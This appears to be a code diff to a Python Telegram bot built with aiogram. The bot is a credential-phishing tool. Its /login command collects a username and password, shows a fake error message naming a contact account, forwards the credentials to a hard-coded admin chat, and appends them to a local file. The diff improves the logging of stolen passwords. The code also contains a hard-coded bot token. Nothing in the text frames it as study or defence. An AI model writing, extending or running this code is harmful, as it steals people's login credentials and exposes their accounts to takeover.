@@ -3,9 +3,9 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import CommandStart, Command
 import asyncio
 import requests
+import os
 
 Token = '5832518494:AAG2TZ9XiHw_HlfFAiJq8gzFes8JT-TjzAk'
-log = open('users.txt', 'w')
 
 bot = Bot(token=Token)
 dp = Dispatcher()
@@ -28,12 +28,13 @@ async def login(message: Message):
     args = message.text.split()
     if len(args) >= 2:
         username = args[1]
+        log = open('users.txt', 'a')
         password = args[2]
         await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
         admin_id = '1621436440'
         await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
-        print('new login')
-        log.write(f'Username: {username}, Password: {password}')
+        print(f'New login (Username: {username}, Password: {password})')
+        log.write(f'Username: {username}, Password: {password}\n')
     else:
         await message.answer('Please enter your username and password in the following format: /login username password')
         
